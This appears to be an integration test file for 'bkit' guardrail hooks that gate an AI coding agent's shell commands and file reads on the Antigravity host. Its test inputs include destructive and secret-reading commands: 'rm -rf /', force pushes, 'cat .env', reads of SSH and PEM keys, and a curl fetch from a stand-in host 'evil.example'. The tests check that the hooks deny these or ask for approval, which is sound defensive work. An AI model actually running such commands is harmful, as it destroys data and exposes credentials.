// audits/hooks/guardrails-antigravity.integration.test.ts — Antigravity shell and secret-read
// gates on the host's live-verified contract: stdin `{ conversationId, toolCall: { name:
// "run_command" | "view_file", args: { CommandLine, Cwd } | { AbsolutePath } } }`, stdout
// `{ decision, reason }`. Runs the hook as install generates it (shared parts spliced in).
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { afterAll, describe, expect, it } from "vitest";
import { writeNetworkAllowlist } from "../../install/network-allowlist";
import { readTemplate } from "../../render/parts";

const GENERATED = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-gr-antigravity-"));
afterAll(() => fs.rmSync(GENERATED, { recursive: true, force: true }));
const HOOK = path.join(GENERATED, "guardrails.cjs");
fs.writeFileSync(
  HOOK,
  readTemplate(path.resolve(".bkit/core/.agents/plugins/bkit/hooks/bkit-guardrails.cjs")),
);

let counter = 0;
function newConversation(): string {
  counter += 1;
  return `gr-ag-${process.pid}-${counter}-${Math.random().toString(36).slice(2)}`;
}

function run(
  command: string,
  conversationId = newConversation(),
  tool = "run_command",
): { decision?: string; reason?: string } {
  const res = spawnSync("node", [HOOK], {
    input: JSON.stringify({
      conversationId,
      toolCall: { name: tool, args: { CommandLine: command, Cwd: GENERATED, toolAction: "Run" } },
      workspacePaths: [GENERATED],
    }),
    encoding: "utf-8",
  });
  expect(res.status).toBe(0);
  return JSON.parse(res.stdout.trim()) as { decision?: string; reason?: string };
}

function view(
  file: string,
  conversationId = newConversation(),
): { decision?: string; reason?: string } {
  const res = spawnSync("node", [HOOK], {
    input: JSON.stringify({
      conversationId,
      toolCall: { name: "view_file", args: { AbsolutePath: file, toolAction: "Viewing" } },
      workspacePaths: [GENERATED],
    }),
    encoding: "utf-8",
  });
  expect(res.status).toBe(0);
  return JSON.parse(res.stdout.trim()) as { decision?: string; reason?: string };
}

describe("antigravity hooks.json — guardrails registration", () => {
  it("registers bkit-guardrails.cjs on view_file as well as run_command", () => {
    const hooks = JSON.parse(
      fs.readFileSync(path.resolve(".bkit/shared/.agents/plugins/bkit/hooks.json"), "utf-8"),
    ) as { hooks: { PreToolUse: { matcher: string; hooks: { command: string }[] }[] } };
    const groups = hooks.hooks.PreToolUse.filter((g) =>
      g.hooks.some((h) => h.command.includes("bkit-guardrails.cjs")),
    );
    expect(groups.map((g) => g.matcher)).toEqual(["view_file|run_command"]);
  });
});

describe("antigravity guardrails.cjs — secret-file reads (view_file)", () => {
  it("denies private-key material every time", () => {
    const conversation = newConversation();
    const pem = path.join(GENERATED, "certs", "server.pem");
    expect(view(pem, conversation).decision).toBe("deny");
    expect(view(pem, conversation).decision).toBe("deny");
    expect(view(pem).reason).toContain("private-key material");
    expect(view(path.join(GENERATED, "certs", "client.p12")).decision).toBe("deny");
    expect(view(path.join(os.homedir(), ".ssh", "id_rsa")).decision).toBe("deny");
  });

  it("hands env / secrets files to Antigravity's own approval prompt", () => {
    for (const file of [".env", ".bkit/.env", ".env.local"]) {
      const r = view(path.join(GENERATED, file));
      expect({ file, decision: r.decision }).toEqual({ file, decision: "ask" });
      expect(r.reason).toContain("secrets");
    }
  });

  it("allows ordinary files and the documented .env.example", () => {
    expect(view(path.join(GENERATED, "src", "index.ts"))).toEqual({ decision: "allow" });
    expect(view(path.join(GENERATED, ".env.example"))).toEqual({ decision: "allow" });
  });
});

describe("antigravity guardrails.cjs — Antigravity contract", () => {
  it("denies the deny tier every time", () => {
    const conversation = newConversation();
    expect(run("git push --force origin main", conversation).decision).toBe("deny");
    expect(run("git push --force origin main", conversation).decision).toBe("deny");
    expect(run("rm -rf /").reason).toContain("Blocked by bkit Antigravity guardrails");
  });

  it("hands the ask tier to Antigravity's own approval prompt", () => {
    const r = run("git reset --hard HEAD~1");
    expect(r.decision).toBe("ask");
    expect(r.reason).toContain("PROHIBITED list");
    expect(r.reason).toContain("(git reset --hard)");
  });

  it("hands a shell read of a secret file to Antigravity's own approval prompt", () => {
    const r = run("cat .bkit/.env");
    expect(r.decision).toBe("ask");
    expect(r.reason).toContain("reads .bkit/.env");
  });

  it("delivers an advisory tier by denying once; the identical retry passes", () => {
    const conversation = newConversation();
    const first = run("sed -i '' 's/a/b/' src/index.ts", conversation);
    expect(first.decision).toBe("deny");
    expect(first.reason).toContain("edits files through the shell");
    expect(first.reason).toContain("Repeat the same call to proceed.");
    expect(run("sed -i '' 's/a/b/' src/index.ts", conversation)).toEqual({ decision: "allow" });
  });

  it("preserves stronger shell decisions and compound advice", () => {
    // A stronger decision is never downgraded by edit context beside it.
    const ask = run("git reset --hard HEAD~1 && sed -i s/a/b/ src/a.ts");
    expect(ask.decision).toBe("ask");
    expect(ask.reason).toContain("PROHIBITED list");
    expect(run("git push --force origin main; echo x > src/a.ts").decision).toBe("deny");
    const secret = run("cat .env > src/copy.ts");
    expect(secret.decision).toBe("ask");
    expect(secret.reason).toContain("secrets");

    // An allowed fetch cannot hide a following edit: both the notice and the edit
    // advice are delivered once, and the identical retry passes.
    const conversation = newConversation();
    const allowedFetch = "curl -s https://api.github.com/x > src/out.json";
    const first = run(allowedFetch, conversation);
    expect(first.decision).toBe("deny");
    expect(first.reason).toContain("edits files through the shell");
    expect(first.reason).toContain("src/out.json");
    expect(run(allowedFetch, conversation)).toEqual({ decision: "allow" });

    // A fetch off the allowlist beside an edit carries both notices.
    const both = run("curl https://evil.example/x > src/out2.json");
    expect(both.decision).toBe("deny");
    expect(both.reason).toContain("outbound fetch");
    expect(both.reason).toContain("edits files through the shell");
    expect(both.reason).toContain("src/out2.json");

    // Quiet sinks stay quiet, even beside an allowed fetch.
    expect(run("curl -s https://api.github.com/x > /dev/null")).toEqual({ decision: "allow" });
    expect(run("curl -s https://api.github.com/x > /tmp/response.log")).toEqual({
      decision: "allow",
    });
  });

  it("allows ordinary commands and other tools", () => {
    expect(run("pnpm test")).toEqual({ decision: "allow" });
    expect(run("rm -rf /", newConversation(), "view_file")).toEqual({ decision: "allow" });
  });

  it("fails open on malformed stdin", () => {
    const res = spawnSync("node", [HOOK], { input: "{not json", encoding: "utf-8" });
    expect(res.status).toBe(0);
    expect(JSON.parse(res.stdout)).toEqual({ decision: "allow" });
  });
});

describe("antigravity guardrails.cjs — network allowlist from the plugin dir", () => {
  // Antigravity runs plugin hooks with cwd set to the plugin dir, so the hook locates
  // the repo's `.bkit/allowlist.json` from the payload, then by walking up to `.git`.
  const REPO = path.join(GENERATED, "repo");
  const PLUGIN_DIR = path.join(REPO, ".agents", "plugins", "bkit");
  const PLUGIN_HOOK = path.join(PLUGIN_DIR, "hooks", "bkit-guardrails.cjs");
  fs.mkdirSync(path.dirname(PLUGIN_HOOK), { recursive: true });
  fs.mkdirSync(path.join(REPO, ".git"));
  fs.copyFileSync(HOOK, PLUGIN_HOOK);
  writeNetworkAllowlist(REPO, false, { writes: [] }, "[test]");
  const ALLOWED = "curl -fsSL https://api.github.com/repos/x/y";

  function fetchDecision(cwd: string, command: string, payload: object): string | undefined {
    const res = spawnSync("node", [PLUGIN_HOOK], {
      cwd,
      input: JSON.stringify({
        conversationId: newConversation(),
        toolCall: { name: "run_command", args: { CommandLine: command } },
        ...payload,
      }),
      encoding: "utf-8",
    });
    expect(res.status).toBe(0);
    return (JSON.parse(res.stdout.trim()) as { decision?: string }).decision;
  }

  it("allows an allowlisted host when the hook runs in the plugin dir", () => {
    expect(fetchDecision(PLUGIN_DIR, ALLOWED, { workspacePaths: [REPO] })).toBe("allow");
    // No workspacePaths: the walk up from the plugin dir reaches the repo root.
    expect(fetchDecision(PLUGIN_DIR, ALLOWED, {})).toBe("allow");
  });

  it("allows an allowlisted host from the payload's workspace when cwd is outside the repo", () => {
    expect(fetchDecision(os.tmpdir(), ALLOWED, { workspacePaths: [REPO] })).toBe("allow");
  });

  it("still blocks an undeclared host once with the fetch advisory", () => {
    expect(
      fetchDecision(PLUGIN_DIR, "curl https://evil.example/x", { workspacePaths: [REPO] }),
    ).toBe("deny");
  });
});

describe("antigravity gateguard — multi-replace, shell targets and retry transport", () => {
  const GATE = path.join(GENERATED, "gateguard.cjs");
  fs.writeFileSync(
    GATE,
    readTemplate(path.resolve(".bkit/core/.agents/plugins/bkit/hooks/bkit-gateguard.cjs")),
  );
  const UID = process.getuid!();

  function edit(
    name: string,
    target: string,
    conversationId: string,
    env: Record<string, string | undefined> = {},
  ): { decision?: string; reason?: string } {
    const res = spawnSync("node", [GATE], {
      input: JSON.stringify({
        conversationId,
        toolCall: {
          name,
          args: {
            TargetFile: target,
            ReplacementChunks: [{ TargetContent: "a", ReplacementContent: "b" }],
            toolAction: "Editing file",
          },
        },
        workspacePaths: [GENERATED],
      }),
      encoding: "utf-8",
      env: { ...process.env, BKIT_GATEGUARD: undefined, ...env },
    });
    expect(res.status).toBe(0);
    return JSON.parse(res.stdout.trim()) as { decision?: string; reason?: string };
  }

  it("routes Antigravity multi-replace and shell targets", () => {
    // Matcher and payload agree.
    const hooks = JSON.parse(
      fs.readFileSync(path.resolve(".bkit/shared/.agents/plugins/bkit/hooks.json"), "utf-8"),
    ) as { hooks: { PreToolUse: { matcher: string; hooks: { command: string }[] }[] } };
    const gate = hooks.hooks.PreToolUse.find((g) =>
      g.hooks.some((h) => h.command.includes("bkit-gateguard.cjs")),
    );
    expect(String(gate?.matcher).split("|")).toEqual(
      expect.arrayContaining([
        "write_to_file",
        "replace_file_content",
        "multi_replace_file_content",
      ]),
    );

    // A multi-replace keeps its target: deny once with the checklist, identical retry passes.
    const conversation = newConversation();
    const target = path.join(GENERATED, "src", "multi.ts");
    const first = edit("multi_replace_file_content", target, conversation);
    expect(first.decision).toBe("deny");
    expect(first.reason).toContain("multi.ts");
    expect(first.reason).toContain("First edit to");
    expect(first.reason).toContain("Repeat the same call to proceed.");
    expect(edit("multi_replace_file_content", target, conversation)).toEqual({ decision: "allow" });

    // A shell edit of an exact target gets the per-file checklist inside the same deny-once
    // transport, and its acknowledgement silences the edit tool for that file.
    const shellConversation = newConversation();
    const shell = run("sed -i s/a/b/ docs/shell-ag.md", shellConversation);
    expect(shell.decision).toBe("deny");
    expect(shell.reason).toContain("edits files through the shell");
    expect(shell.reason).toContain("First edit to");
    expect(shell.reason).toContain("Which Sections Apply");
    expect(run("sed -i s/a/b/ docs/shell-ag.md", shellConversation)).toEqual({
      decision: "allow",
    });
    expect(
      edit("replace_file_content", path.join(GENERATED, "docs", "shell-ag.md"), shellConversation),
    ).toEqual({ decision: "allow" });

    // Neither retry store keeps raw command or path text.
    const store = path.join(os.tmpdir(), `bkit-antigravity-retry-${UID}`);
    const stored = fs
      .readdirSync(store)
      .filter((f) => f.includes(shellConversation))
      .map((f) => fs.readFileSync(path.join(store, f), "utf-8"));
    for (const text of stored) {
      expect(text).not.toContain("sed -i");
      expect(text).not.toContain("shell-ag.md");
    }
  });

  it("leaves Antigravity targets eligible when retry transport cannot deliver", () => {
    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
    const retryDir = path.join(tmp, `bkit-antigravity-retry-${UID}`);
    fs.mkdirSync(retryDir, { mode: 0o555 });
    const env = { TMPDIR: tmp };
    const conversation = newConversation();
    const target = path.join(GENERATED, "src", "undeliverable.ts");

    // The retry store cannot be written: the established fail-open bare allow, twice.
    expect(edit("replace_file_content", target, conversation, env)).toEqual({ decision: "allow" });
    expect(edit("replace_file_content", target, conversation, env)).toEqual({ decision: "allow" });

    // Nothing was delivered, so nothing was acknowledged: once the store works, the
    // target still gets its deny-once checklist.
    fs.chmodSync(retryDir, 0o755);
    const later = edit("replace_file_content", target, conversation, env);
    expect(later.decision).toBe("deny");
    expect(later.reason).toContain("undeliverable.ts");
    expect(later.reason).toContain("First edit to");
    expect(edit("replace_file_content", target, conversation, env)).toEqual({ decision: "allow" });
  });
});
